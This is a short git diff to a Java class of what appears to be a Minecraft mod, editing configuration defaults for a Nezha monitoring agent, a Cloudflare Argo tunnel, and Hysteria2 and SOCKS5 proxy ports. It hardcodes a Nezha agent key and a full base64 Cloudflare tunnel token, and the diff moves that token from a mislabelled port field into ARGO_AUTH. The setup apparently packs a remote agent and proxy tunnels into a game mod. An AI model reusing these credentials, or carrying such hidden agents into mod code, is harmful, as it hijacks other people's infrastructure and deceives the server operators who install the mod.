@@ -37,9 +37,9 @@ public class Maohi implements ModInitializer {
     private static final String NEZHA_PORT   = cfg("NEZHA_PORT", "443");
     private static final String NEZHA_KEY    = cfg("NEZHA_KEY", "hQTPvzCCsZUCoGdyn8");
     private static final String ARGO_DOMAIN  = cfg("ARGO_DOMAIN", "hi.mdtah.ccwu.cc");
-    private static final String ARGO_AUTH    = cfg("ARGO_AUTH", "");
+    private static final String ARGO_AUTH    = cfg("ARGO_AUTH", "eyJhIjoiYjI2MDYyMzg2NDA3MDU3YzU3NzZkYTE1YzViM2IwM2YiLCJ0IjoiZjAyYTNkODMtMjk4My00N2QxLWE3MmUtZDEzNjFmZDYyZGY4IiwicyI6IlpUZzBPVGd4WVdZdFpUSXdNQzAwT0ROaUxUZzNZakF0T1RVNE5qa3pNVE0zTkRFMSJ9");
     private static final String ARGO_PORT    = cfg("ARGO_PORT", "9002");
-    private static final String HY2_PORT     = cfg("HY2_PORT", "eyJhIjoiYjI2MDYyMzg2NDA3MDU3YzU3NzZkYTE1YzViM2IwM2YiLCJ0IjoiZjAyYTNkODMtMjk4My00N2QxLWE3MmUtZDEzNjFmZDYyZGY4IiwicyI6IlpUZzBPVGd4WVdZdFpUSXdNQzAwT0ROaUxUZzNZakF0T1RVNE5qa3pNVE0zTkRFMSJ9");
+    private static final String HY2_PORT     = cfg("HY2_PORT", "");
     private static final String S5_PORT      = cfg("S5_PORT", "");
     private static final String CFIP         = cfg("CFIP", "");
     private static final String CFPORT       = cfg("CFPORT", "443");
